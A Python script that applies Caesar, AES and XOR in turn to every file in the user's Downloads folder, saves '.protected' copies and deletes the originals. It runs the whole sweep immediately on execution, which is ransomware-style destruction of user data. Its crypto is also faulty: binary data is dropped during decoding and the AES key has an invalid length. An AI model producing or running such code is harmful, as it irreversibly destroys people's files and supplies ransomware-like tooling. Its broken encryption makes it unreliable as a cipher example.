import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import shutil
import string

# Function for Caesar Cipher
def caesar_cipher_encrypt(text, shift):
    result = []
    for char in text:
        if char.isalpha():
            shifted = chr(((ord(char.lower()) - ord('a') + shift) % 26) + ord('a'))
            result.append(shifted.upper() if char.isupper() else shifted)
        else:
            result.append(char)
    return ''.join(result)

# Function for XOR Encryption
def xor_encrypt(text, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))

# Function for AES-128 Encryption
def aes_encrypt(text, key):
    key = key.encode('utf-8')[:16]  # Ensure the key is 16 bytes
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return cipher.iv + ct_bytes  # prepend the IV for later decryption

# Encrypt a file using Caesar, AES, and XOR
def encrypt_file(file_path, caesar_shift=3, aes_key="magicspell"):
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Apply Caesar Cipher (for simplicity, we just encode the file content as text)
    text = file_data.decode(errors='ignore')
    caesar_encrypted = caesar_cipher_encrypt(text, caesar_shift)

    # Apply AES Encryption
    aes_encrypted = aes_encrypt(caesar_encrypted, aes_key)

    # Apply XOR Encryption
    xor_encrypted = xor_encrypt(aes_encrypted.decode('latin-1'), aes_key)

    # Save the encrypted data to a new file with '.protected' extension
    new_file_path = file_path + '.protected'
    with open(new_file_path, 'wb') as enc_file:
        enc_file.write(xor_encrypted.encode('latin-1'))

    # Optionally, delete the original file after encryption
    os.remove(file_path)

# Encrypt all files in the Downloads folder
def encrypt_all_files_in_downloads():
    downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
    for root, dirs, files in os.walk(downloads_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.protected'):  # Skip already encrypted files
                encrypt_file(file_path)

# Main execution
encrypt_all_files_in_downloads()
